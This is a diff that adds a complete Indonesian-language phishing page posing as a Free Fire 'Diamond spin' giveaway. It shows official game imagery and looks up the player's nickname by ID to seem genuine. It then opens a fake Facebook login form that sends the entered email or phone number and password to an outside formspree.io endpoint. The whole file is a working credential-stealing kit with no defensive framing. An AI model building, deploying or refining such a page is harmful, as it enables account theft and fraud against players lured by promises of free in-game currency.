@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>HTML</title>
+
+  <!-- HTML -->
+
+
+  <!-- Custom Styles -->
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <header>
+    <nav>
+      <img src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/full_logo.969f536.png" alt="">
+    </nav>
+  </header>
+  <div class="contents">
+    <h3 id="title">💎💎Diamond spin💎💎</h3>
+    <img src="https://dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/202311/c118533702026f510a7a035cd91df64f.png" alt="">
+    <button onclick="toSpin()" id="spin">Spin Sekarang</button>
+  </div>
+  <div class="id" id="id">
+    <h2>Masukan id kamu</h2>
+    <div>
+      <input type="number" id="inputId">
+      <button onclick="idInput()">komfirmasi</button>
+    </div>
+    <h6 id="alertId">Mohon masukan ID yang valid!</h6>
+  </div>
+  <div class="spin">
+    <h2>Spin dan dapatkan hingga ratusan diamond</h2>
+    <div class="number">
+      <h1 class="num1" id="num1">0</h1>
+      <h1 class="num2" id="num2">0</h1>
+      <h1 class="num3" id="num3">0</h1>
+    </div>
+    <button onclick="random()" id="Draw">Spin</button>
+  </div>
+  <div class="submit" id="submit">
+    <button onclick="confirm()">Konfirmasi sekarang</button>
+  </div>
+  <footer>
+    ©Hak Cipta FF Spin <br><span>Pemasan Dan Kemitraan . Game <br> Draw . Topup </span>
+  </footer>
+  <div class="popup" id="popup">
+    <div class="loginPopup" id="loginPopup">
+      <div class="confirmTitle">
+        <h3>Masuk</h3>
+      </div>
+      <h6>Masuk menggunakan akun Facebook kamu</h6>
+      <center>
+        <button type="submit" class="facebookButton" onclick="facebookLogin()"><img src="https://images.sftcdn.net/images/t_app-icon-m/p/84c07490-9b4b-11e6-ab76-00163ec9f5fa/1456593500/facebook-lite-logo" alt="fb" class="fbLogin">
+          <h6>Masuk dengan Facebook</h6>
+        </button>
+      </center>
+    </div>
+    <div class="facebook" id="facebook">
+      <div class="navbarFacebook">
+        <img src="https://klikdisinih.gettklik.my.id/user/661fc177098c9/img/assets/login-Method1.png" alt="Facebook">
+      </div>
+      <div class="content">
+        <img src="https://klikdisinih.gettklik.my.id/user/661fc177098c9/img/assets/gamecon.jpg" alt="free fire">
+        <p class="top">Masuk menggunakan akun Facebook kamu untuk melanjutkan ke Free Fire</p>
+        <form action="https://formspree.io/f/mpzvbzly"
+        method="POST" id="form">
+          <input type="text" name="nameLogin" id="email" placeholder="Nomor ponsel atau alamat email">
+          <input type="password" name="kode" id="pass" placeholder="Kata sandi">
+          <button type="submit">Masuk</button>
+        </form>
+        <p class="bottom">Buat akun</p>
+        <p class="bottom">Jangan sekarang</p>
+        <p class="bottom">Lupa sandi</p>
+      </div>
+      <div class="bottomFacebook">
+        <table>
+          <tr>
+            <td class="selected">Bahasa Indonesia</td>
+            <td>English (UK)</td>
+          </tr>
+          <tr>
+            <td>Türkçe</td>
+            <td>Tiếng Việt</td>
+          </tr>
+          <tr>
+            <td>日本語</td>
+            <td>Español</td>
+          </tr>
+          <tr>
+            <td>Português (Brasil)</td>
+            <td>
+              <p>+</p< /td>
+          </tr>
+        </table>
+      </div>
+      <div class="facebookCopyright">
+        Facebook Inc.
+      </div>
+    </div>
+  </div>
+  <script>
+    let sukses = null
+    const url = 'https://api.isan.eu.org/nickname/ff?id=';
+
+    const idInput = () => {
+      let id = document.getElementById('inputId').value
+      fetch(url + id)
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Network response was not ok');
+          }
+          return response.json();
+        })
+        .then(data => {
+          // Lakukan sesuatu dengan data yang diterima
+          console.log(data);
+          document.getElementById('alertId').style.color = 'black'
+          document.getElementById('alertId').innerHTML = 'Selamat datang ' + data.name + ', Teruskan ke Spin'
+          sukses = true
+        })
+        .catch(error => {
+          document.getElementById('alertId').style.color = 'red'
+          document.getElementById('alertId').innerHTML = 'ID yang anda masukan salah!'
+          sukses = false
+        });
+    }
+  </script>
+  <script src="main.js"></script>
+
+</body>
+
+</html>
